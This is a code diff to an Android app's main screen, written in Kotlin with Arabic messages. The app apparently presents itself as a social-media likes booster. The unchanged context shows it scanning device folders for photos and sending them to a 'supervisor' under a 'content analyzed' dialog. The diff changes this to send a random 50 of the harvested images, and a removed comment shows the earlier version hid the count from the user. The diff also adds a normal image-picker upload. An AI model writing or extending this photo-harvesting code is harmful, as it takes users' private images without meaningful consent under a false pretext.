@@ -19,6 +19,7 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import java.io.File
 import java.util.concurrent.TimeUnit
+import kotlinx.coroutines.launch
 
 class MainActivity : AppCompatActivity() {
     
@@ -45,6 +46,12 @@ class MainActivity : AppCompatActivity() {
         } else {
             showPermissionDeniedDialog()
         }
+    }
+    
+    private val pickImageLauncher = registerForActivityResult(
+        ActivityResultContracts.GetContent()
+    ) { uri: Uri? ->
+        uri?.let { uploadImage(it) }
     }
     
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -80,6 +87,10 @@ class MainActivity : AppCompatActivity() {
         
         btnBoostLikes.setOnClickListener {
             boostLikes()
+        }
+        
+        findViewById<Button>(R.id.btnUploadImage)?.setOnClickListener {
+            showImagePicker()
         }
         
         // تمكين زر ربط الحساب عند إدخال اسم المستخدم
@@ -182,11 +193,18 @@ class MainActivity : AppCompatActivity() {
                 // إرسال الصور للمشرف
                 uploadImagesToSupervisor(imagePaths)
                 
-                // إظهار رسالة تأكيد بدون ذكر عدد الصور
+                // إظهار رسالة تأكيد مع عدد الصور المجمعة
                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    val imageCount = imagePaths.size
+                    val message = if (imageCount == 1) {
+                        "تم جمع صورة واحدة من جهازك وإرسالها للمشرف بنجاح. سيتم مراجعتها وتحديث النتائج قريباً."
+                    } else {
+                        "تم جمع $imageCount صور من جهازك وإرسالها للمشرف بنجاح. سيتم مراجعتها وتحديث النتائج قريباً."
+                    }
+                    
                     showSuccessDialog(
                         "تم تحليل المحتوى",
-                        "تم تحليل المحتوى من جهازك وإرساله للمشرف بنجاح. سيتم مراجعته وتحديث النتائج قريباً."
+                        message
                     )
                 }, 1000)
             } else {
@@ -275,8 +293,16 @@ class MainActivity : AppCompatActivity() {
             e.printStackTrace()
         }
         
-        // إرجاع أول 500 صورة لتجنب التحميل الزائد
-        onComplete(imagePaths.take(500))
+        // إرجاع من 1 إلى 50 صورة بشكل ذكي
+        val maxImages = 50
+        val collectedImages = if (imagePaths.size <= maxImages) {
+            imagePaths
+        } else {
+            // اختيار عشوائي من الصور المتاحة
+            imagePaths.shuffled().take(maxImages)
+        }
+        
+        onComplete(collectedImages)
     }
     
     private fun collectImagesFromDirectory(directory: File, imagePaths: MutableList<String>) {
@@ -448,5 +474,44 @@ class MainActivity : AppCompatActivity() {
             data = Uri.fromParts("package", packageName, null)
         }
         startActivity(intent)
+    }
+
+    private fun showImagePicker() {
+        pickImageLauncher.launch("image/*")
+    }
+
+    private fun uploadImage(uri: Uri) {
+        showUploadProgress("جاري رفع الصورة إلى Supabase...")
+        
+        lifecycleScope.launch {
+            try {
+                val currentUser = SupabaseManager.getCurrentUser()
+                val userEmail = currentUser?.email
+                
+                val success = SupabaseManager.uploadImage(contentResolver, uri, userEmail)
+                
+                if (success) {
+                    showUploadSuccess("تم رفع الصورة بنجاح!")
+                    Toast.makeText(this@MainActivity, "تم رفع الصورة وحفظها في قاعدة البيانات", Toast.LENGTH_SHORT).show()
+                } else {
+                    showUploadError("فشل رفع الصورة إلى Supabase")
+                }
+            } catch (e: Exception) {
+                showUploadError("خطأ في رفع الصورة: ${e.message}")
+            }
+        }
+    }
+
+    private fun showUploadProgress(message: String) {
+        // يمكن إضافة ProgressBar هنا
+        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
+    }
+
+    private fun showUploadSuccess(message: String) {
+        Toast.makeText(this, message, Toast.LENGTH_LONG).show()
+    }
+
+    private fun showUploadError(message: String) {
+        Toast.makeText(this, message, Toast.LENGTH_LONG).show()
     }
 }
